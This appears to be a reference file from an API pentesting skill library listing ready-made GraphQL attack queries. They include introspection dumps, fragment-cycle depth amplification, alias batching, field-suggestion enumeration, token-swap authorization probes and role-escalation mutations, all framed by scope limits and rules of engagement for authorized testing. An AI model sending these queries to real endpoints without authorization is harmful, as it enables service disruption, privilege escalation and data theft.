---
name: graphql_attack_surface
description: 'GraphQL attack surface: queries verbatim, probes and templates (from
  api_graphql_websockets specialist reference library)'
---

# GraphQL attack surface: queries verbatim, probes and templates

All queries are sent as POST with `Content-Type: application/json` and body
`{"query": "<document>"}` unless noted. Substitute the engagement endpoint.
Every probe is scope-guarded and produces an evidence pair.

## 1. Introspection

### 1.1 Minimal probe (existence + open state)

```json
{"query":"query IntrospectionProbe { __schema { queryType { name } } }"}
```

- 200 + `data.__schema` -> introspection open.
- Error naming "introspection"/"disabled"/"not allowed" -> endpoint exists,
  introspection blocked; continue with field suggestions (1.3).
- 404/HTML -> wrong path; try `/api/graphql`, `/v1/graphql`, `/graphql/v1`,
  `/graphiql`, `/playground` (from `10`'s probe list).

### 1.2 Full standard IntrospectionQuery (what graphql_dump.py sends)

```graphql
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives {
      name
      description
      locations
      args { ...InputValue }
    }
  }
}

fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType { kind name }
            }
          }
        }
      }
    }
  }
}

fragment InputValue on __InputValue {
  name
  description
  type { ...TypeRef }
  defaultValue
}

fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated
    deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes { ...TypeRef }
}
```

Run via `scripts/graphql_dump.py` (saves the response, prints type/field
counts). Note `subscriptionType` — if present, the WS surface in the
websocket checklist applies to the subscription transport too.

## 2. Depth and complexity test documents

Score OFFLINE with `scripts/graphql_depth_check.py --query-file` first; the
RoE (master section 0) allows one bounded probe per limit class, never an
upward sweep.

### 2.1 Bounded nested depth (depth 5, complexity 5)

```graphql
query DepthProbe {
  viewer {
    friends(first: 1) {
      edges { node {
        friends(first: 1) {
          edges { node {
            friends(first: 1) {
              edges { node { id name }
            }
          }
        }
      }
    }
  }
} }
```

(Adjust field names to the dumped schema; keep `first: 1` on every
connection — bounds the result set, isolating the depth question from data
volume.)

### 2.2 Fragment-cycle amplification (the classic unbounded shape)

```graphql
query FragCycle {
  ...a
}
fragment a on Query {
  ...b
  __typename
}
fragment b on Query {
  ...a
  __typename
}
```

`graphql_depth_check.py` flags fragment cycles and reports the depth the
cycle would produce. A server without a depth limiter typically 500s/times
out on the expanded form — do NOT expand it by hand; one bounded expansion
(depth-limited rewrite, e.g. 10 levels) is the maximum probe.

### 2.3 What to record per probe

| Server answer | Meaning | Finding |
|---|---|---|
| 400 with `depth`/`complexity` error | limiter present | negative result, keep |
| 200 with partial data | no limiter, resolver bail-out | D1 depth finding |
| Timeout / 5xx | no limiter, cost paid server-side | D1 finding + RoE note, stop immediately |

## 3. Aliasing and batching patterns (bounded)

### 3.1 Aliased duplicates in one document (5 copies — the bound)

```graphql
query AliasProbe {
  a1: node(id: "4") { id secretField }
  a2: node(id: "4") { id secretField }
  a3: node(id: "4") { id secretField }
  a4: node(id: "4") { id secretField }
  a5: node(id: "4") { id secretField }
}
```

Use `node(id: "4")` per role token. If the rate limiter counts requests and
the server executed 5 operations, that is one request -> N operations —
record the limiter's visible counter before/after if the API exposes one.

### 3.2 Array batching (Apollo-style)

```json
[
  {"query":"query A { viewer { id } }"},
  {"query":"query B { viewer { email } }"}
]
```

Many gateways disable this; a 400 "batching not allowed" is a keepable
negative result.

### 3.3 Prohibition reminder

Aliasing/batching used for credential stuffing, token enumeration or any
high-volume guessing is resource-exhaustion-adjacent and requires written
authorization; the default engagement bound is the 5-alias single-shot demo
above. Anything beyond hands off to `58` with the authorization question.

## 4. Field-suggestion probing (introspection disabled)

GraphQL servers (GraphQL.js-style error suggestions, graphiql-backed
gateways) echo `Did you mean 'email'?` for near-miss names. Probe one
near-miss per field guess, serially:

```graphql
query Suggest { user(id: "4") { emaill } }
query Suggest2 { user(id: "4") { userEmaill } }
query Suggest3 { user(id: "4") { mailAddress } }
```

Each distinct "Did you mean X" adds field X to the reconstructed schema;
record every request/response pair. This proves "introspection disabled" is
not access control — pair it with a successful cross-role fetch of the
suggested field for a real finding.

## 5. Field-level authorization templates

### 5.1 Per-role identical document (token swap from `30`)

Send the SAME document under each role's token and diff responses:

```graphql
query AuthZField {
  user(id: "1042") {
    id
    email
    role
    internalNotes
    apiToken
    invoices(first: 5) { edges { node { id totalCents } } }
  }
}
```

Findings matrix: field x role -> visible/hidden/error/null-masked. A field
that returns data under a lower-privilege token than the UI ever shows that
role is the finding; null-masking vs error distinguishes design vs bug.

### 5.2 Mutation audit template

```graphql
mutation M1 { updateProfile(input: { id: "1042", role: "ADMIN" }) { ok } }
mutation M2 { changePassword(userId: "1042", newPassword: "...") { ok } }
mutation M3 { addMember(accountId: "7", userId: "1042", role: "OWNER") { ok } }
```

Check per mutation: missing validation (role accepts arbitrary strings),
id-based object references (operates on ANY id, not just the caller's),
cross-role writes. Mutations run against operator-created synthetic records
only; cleanup per master section 0.

## 6. Persisted queries / GET form (CSRF angle handoff)

```
GET /graphql?query={user(id:"1042"){email}} HTTP/1.1
```

or the APQ form:

```
GET /graphql?extensions={"persistedQuery":{"version":1,
  "sha256Hash":"<hash-of-registered-query>"}}&variables={"id":"1042"}
```

If a GET with a simple query string returns data without a custom header,
the response is readable cross-origin from any web page — capture the exact
GET form (request+response) and hand to `55-client-side-attacks` for the
browser-side proof; do not build the PoC page here.

